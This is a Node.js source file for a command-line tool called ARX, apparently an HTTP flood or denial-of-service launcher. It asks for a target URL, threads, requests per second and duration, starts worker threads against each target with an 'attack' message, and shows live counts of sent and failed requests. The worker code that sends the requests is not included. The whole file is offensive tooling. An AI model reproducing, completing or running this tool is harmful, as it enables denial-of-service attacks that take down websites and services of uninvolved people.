// main.js
const readline = require('readline');
const { Worker } = require('worker_threads');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

console.log("\x1b[36mSelamat datang di ARX - Advanced Request eXecutor\x1b[0m");

function ask(query) {
  return new Promise(resolve => rl.question(query, answer => resolve(answer.trim())));
}

let targetIndex = 0;
const targets = [];
const workers = [];
const statsMap = new Map();

async function configureAndStartTarget() {
  const url = await ask("Target URL: ");
  const threads = parseInt(await ask("Threads (default 10): ")) || 10;
  const rps = parseInt(await ask("RPS (default 100): ")) || 100;
  const duration = parseInt(await ask("Duration in seconds (default 30): ")) || 30;

  const id = targetIndex++;
  targets.push({ id, url });
  statsMap.set(id, { sent: 0, success: 0, failed: 0 });

  console.log(`\n[INFO] Starting attack on ${url} for ${duration}s with ${threads} threads at ${rps} RPS.`);

  for (let i = 0; i < threads; i++) {
    const worker = new Worker('./worker.js', {
      workerData: { url, rps: rps / threads, duration, index: id, statsInterval: 1 }
    });

    worker.on('message', msg => {
      if (msg.type === 'stats') {
        const stat = statsMap.get(msg.index);
        stat.sent += msg.sent;
        stat.success += msg.success;
        stat.failed += msg.failed;
        updateStatsDisplay();
      }
    });

    workers.push(worker);
  }
}

function updateStatsDisplay() {
  readline.cursorTo(process.stdout, 0);
  readline.moveCursor(process.stdout, 0, -targets.length);
  for (const t of targets) {
    const s = statsMap.get(t.id);
    process.stdout.write(`[STATS #${t.id}] Sent: ${s.sent} | Success: ${s.success} | Failed: ${s.failed}            \n`);
  }
  process.stdout.write("Command (next/stop): ");
}

function listenCommands() {
  rl.on('line', async (line) => {
    const cmd = line.trim();
    if (cmd === 'next') {
      await configureAndStartTarget();
    } else if (cmd === 'stop') {
      console.log("[INFO] Stopping all workers...");
      for (const w of workers) w.terminate();
      rl.close();
      process.exit(0);
    } else {
      process.stdout.write("Command (next/stop): ");
    }
  });
}

(async () => {
  await configureAndStartTarget();
  listenCommands();
})();
